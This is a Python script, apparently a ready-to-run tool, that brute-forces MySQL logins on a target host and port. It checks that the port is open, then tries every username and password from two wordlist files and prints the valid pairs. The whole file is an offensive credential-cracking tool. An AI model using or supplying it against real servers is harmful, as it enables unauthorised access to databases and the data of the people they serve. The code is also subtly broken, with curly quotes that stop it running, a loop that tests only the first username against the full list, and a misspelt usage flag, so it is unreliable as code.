import pymysql
import argparse
import sys
from socket import *
import threading

‘’‘
用户名：username.txt
密码：password.txt

’‘’

class Crack_Mysql():


	def __init__(self,tarhost,tarport):
		self.tarhost = tarhost
		self.tarport = int(tarport)

	def socket_connect_mysql(self):
		try:
			setdefaulttimeout(3)
			s = socket(AF_INET,SOCK_STREAM)
			s.connect((self.tarhost,self.tarport))
			print("{}:{} Open".format(self.tarhost,self.tarport))
			return True
		except:
			print("{}:{} Closed".format(self.tarhost,self.tarport))
			return False

	def Access_Mysql(self,username,password,data):
		try:
			db = pymysql.connect(self.tarhost,username,password,data)
			print("Host:{} --> {}:{} -> {} Seccuss".format(db.host_info,username,password,data))
			return True
		except:
			print("{} Failed".format(self.tarhost))
			return False


	def Crack_Mysqls(self,data):
		with open('username.txt') as f_user:
			with open('password.txt') as f_pass:
				for x in f_user:
					for xx in f_pass:
						username = x.strip('\n')
						password = xx.strip('\n')
						self.Access_Mysql(username,password,data)


def main():
	p = argparse.ArgumentParser(usage='Python class_Mysql.py --host 192.168.4.105 --port 3306 --ddbname mysql',description='Crack Mysql')
	p.add_argument('--host',type=str,help='Input host')
	p.add_argument('--port',type=int,help='Input Port')
	p.add_argument('--dbname',type=str,help="Input database name")
	args = p.parse_args()
	host = args.host
	port = args.port
	dbname = args.dbname
	mysql_pj = Crack_Mysql(host,port)
	mysql_pj.Crack_Mysqls(dbname)



if __name__ == '__main__':
    main()

